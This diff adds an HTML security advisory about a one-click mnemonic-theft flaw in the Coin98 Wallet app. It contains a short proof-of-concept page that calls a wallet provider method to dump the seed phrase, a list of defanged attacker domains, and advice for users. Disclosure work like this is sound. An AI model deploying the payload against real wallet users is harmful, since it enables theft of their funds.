@@ -1,0 +1,195 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Coin98 Wallet App Mnemonic Theft Vulnerability</title>
+    <style>
+      :root {
+        color-scheme: light;
+        --text: #1f2933;
+        --muted: #5b6673;
+        --border: #d8dee6;
+        --panel: #f7f9fb;
+        --warning: #8a3b12;
+        --warning-bg: #fff3e8;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      body {
+        margin: 0;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        line-height: 1.6;
+        color: var(--text);
+        background: #fff;
+      }
+
+      main {
+        width: min(900px, calc(100% - 32px));
+        margin: 0 auto;
+        padding: 40px 0 56px;
+      }
+
+      h1,
+      h2 {
+        line-height: 1.25;
+      }
+
+      h1 {
+        margin: 0 0 24px;
+        font-size: clamp(2rem, 4vw, 3rem);
+      }
+
+      h2 {
+        margin: 36px 0 12px;
+        padding-top: 20px;
+        border-top: 1px solid var(--border);
+        font-size: 1.35rem;
+      }
+
+      p {
+        margin: 0 0 14px;
+      }
+
+      strong {
+        color: #111827;
+      }
+
+      ul {
+        margin: 0;
+        padding-left: 1.3rem;
+      }
+
+      li + li {
+        margin-top: 8px;
+      }
+
+      pre {
+        margin: 18px 0;
+        padding: 16px;
+        overflow-x: auto;
+        border: 1px solid var(--border);
+        border-radius: 6px;
+        background: var(--panel);
+      }
+
+      code {
+        font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+        font-size: 0.92rem;
+      }
+
+      .notice {
+        margin: 18px 0;
+        padding: 14px 16px;
+        border: 1px solid #f0c49b;
+        border-radius: 6px;
+        color: var(--warning);
+        background: var(--warning-bg);
+      }
+
+      .ioc-list {
+        display: grid;
+        gap: 10px;
+        margin-top: 12px;
+      }
+
+      .ioc {
+        padding: 12px 14px;
+        border: 1px solid var(--border);
+        border-radius: 6px;
+        background: var(--panel);
+      }
+
+      .ioc code {
+        display: block;
+        margin-bottom: 4px;
+        color: #111827;
+        word-break: break-word;
+      }
+
+      .ioc span {
+        color: var(--muted);
+      }
+
+      figure {
+        margin: 24px 0 0;
+      }
+
+      img {
+        display: block;
+        width: min(100%, 520px);
+        height: auto;
+        border: 1px solid var(--border);
+        border-radius: 6px;
+      }
+
+      figcaption {
+        margin-top: 8px;
+        color: var(--muted);
+        font-size: 0.95rem;
+      }
+    </style>
+  </head>
+  <body>
+    <main>
+      <h1>Coin98 Wallet App 1-Click Mnemonic Theft Vulnerability Is Being Exploited in the Wild</h1>
+
+      <section aria-labelledby="impact">
+        <h2 id="impact">Impact</h2>
+        <p>Opening a malicious DApp inside the wallet app is enough to cause the mnemonic phrase to be stolen.</p>
+        <p>
+          A DeepLink can be used to open the wallet app and redirect it to a malicious DApp. In other words,
+          <strong>a single click can lead to your mnemonic phrase being stolen.</strong>
+        </p>
+
+        <pre><code>&lt;!doctype html&gt;
+&lt;html lang="en"&gt;
+  &lt;head&gt;
+    &lt;meta charset="UTF-8" /&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0" /&gt;
+    &lt;title&gt;Document&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;script&gt;
+      (async function () {
+        const j1 = await window.ethereum.request({ method: "santinizeKey" });
+        alert(JSON.stringify(j1));
+      })();
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+        <figure>
+          <img src="1.png" alt="Screenshot related to the Coin98 Wallet vulnerability report" />
+          <figcaption>Screenshot from the vulnerability report.</figcaption>
+        </figure>
+      </section>
+
+      <section aria-labelledby="iocs">
+        <h2 id="iocs">IoCs</h2>
+        <div class="notice">Attacker domains. Do not click.</div>
+        <div class="ioc-list">
+          <div class="ioc">
+            <code>https://coin98[.]fun</code>
+            <span>phishing page</span>
+          </div>
+          <div class="ioc">
+            <code>https://aicoinhk[.].com</code>
+            <span>attacker's server for receiving mnemonic phrases</span>
+          </div>
+        </div>
+      </section>
+
+      <section aria-labelledby="recommendations">
+        <h2 id="recommendations">Recommendations for Coin98 Wallet Users</h2>
+        <ul>
+          <li>Stop using Coin98 Wallet immediately and switch to another wallet.</li>
+          <li>If you have recently clicked an unknown link, immediately transfer your assets to another wallet.</li>
+        </ul>
+      </section>
+    </main>
+  </body>
+</html>
